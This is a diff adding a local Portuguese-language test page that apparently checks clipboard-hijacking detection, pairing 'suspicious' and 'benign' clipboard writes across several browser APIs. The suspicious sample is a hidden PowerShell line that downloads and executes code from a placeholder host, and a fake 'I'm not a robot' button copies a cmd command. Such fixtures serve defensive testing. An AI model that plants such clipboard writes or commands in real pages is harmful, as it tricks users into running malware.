@@ -15,10 +15,92 @@
   <button id="fake-check">Não sou um robô</button>
   <button id="copy-legitimate">Copiar comando legítimo</button>
   <p id="status" aria-live="polite"></p>
+  <fieldset>
+    <legend>Testes locais de gravação</legend>
+    <button id="try-write-text">Suspeito: writeText</button>
+    <button id="try-write">Suspeito: write(ClipboardItem)</button>
+    <button id="try-exec-copy">Suspeito: execCommand copy</button>
+    <button id="try-exec-cut">Suspeito: execCommand cut</button>
+    <button id="try-event-copy">Suspeito: evento copy/setData</button>
+    <button id="try-event-cut">Suspeito: evento cut/setData</button>
+    <button id="benign-write-text">Benigno: writeText</button>
+    <button id="benign-write">Benigno: write(ClipboardItem)</button>
+    <button id="benign-exec-copy">Benigno: execCommand copy</button>
+    <button id="benign-exec-cut">Benigno: execCommand cut</button>
+    <button id="benign-event-copy">Benigno: evento copy/setData</button>
+    <button id="benign-event-cut">Benigno: evento cut/setData</button>
+  </fieldset>
   <label for="paste-target">Campo de teste de colagem:</label>
   <input id="paste-target" type="text" size="60" placeholder="Use Ctrl+V aqui">
   <script>
     const status = document.querySelector("#status");
+    const suspicious = 'powershell -w hidden -c "iwr exemplo.invalid/a | iex"';
+    const benign = "texto normal para controle";
+    function selectText(text) {
+      let field = document.querySelector("#clipboard-source");
+      if (!field) {
+        field = document.createElement("textarea");
+        field.id = "clipboard-source";
+        field.style.cssText = "position:fixed;left:-10000px;top:-10000px";
+        document.body.append(field);
+      }
+      field.value = text;
+      field.focus();
+      field.select();
+    }
+    async function writeText(text) {
+      try {
+        await navigator.clipboard.writeText(text);
+        status.textContent = "writeText resolveu.";
+      } catch (error) {
+        status.textContent = `writeText falhou: ${error.message}`;
+      }
+    }
+    async function writeItem(text) {
+      try {
+        await navigator.clipboard.write([
+          new ClipboardItem({
+            "text/plain": new Blob([text], { type: "text/plain" }),
+            "text/html": new Blob([`<p>${text}</p>`], { type: "text/html" })
+          })
+        ]);
+        status.textContent = "write resolveu.";
+      } catch (error) {
+        status.textContent = `write falhou: ${error.message}`;
+      }
+    }
+    function execCopy(text, command = "copy") {
+      selectText(text);
+      status.textContent = `execCommand ${command}: ${document.execCommand(command)}`;
+    }
+    function eventCopy(text, type = "copy") {
+      selectText("seleção benigna");
+      document.addEventListener(type, (event) => {
+        event.clipboardData.setData("text/plain", text);
+        event.preventDefault();
+      }, { once: true });
+      status.textContent = `evento ${type}: ${document.execCommand(type)}`;
+    }
+    for (const [id, text] of [
+      ["try-write-text", suspicious],
+      ["benign-write-text", benign]
+    ]) document.querySelector(`#${id}`).addEventListener("click", () => writeText(text));
+    for (const [id, text] of [
+      ["try-write", suspicious],
+      ["benign-write", benign]
+    ]) document.querySelector(`#${id}`).addEventListener("click", () => writeItem(text));
+    for (const [id, text, command] of [
+      ["try-exec-copy", suspicious, "copy"],
+      ["try-exec-cut", suspicious, "cut"],
+      ["benign-exec-copy", benign, "copy"],
+      ["benign-exec-cut", benign, "cut"]
+    ]) document.querySelector(`#${id}`).addEventListener("click", () => execCopy(text, command));
+    for (const [id, text, type] of [
+      ["try-event-copy", suspicious, "copy"],
+      ["try-event-cut", suspicious, "cut"],
+      ["benign-event-copy", benign, "copy"],
+      ["benign-event-cut", benign, "cut"]
+    ]) document.querySelector(`#${id}`).addEventListener("click", () => eventCopy(text, type));
     document.querySelector("#fake-check").addEventListener("click", async () => {
       try {
         await navigator.clipboard.writeText("cmd /c echo test && calc");
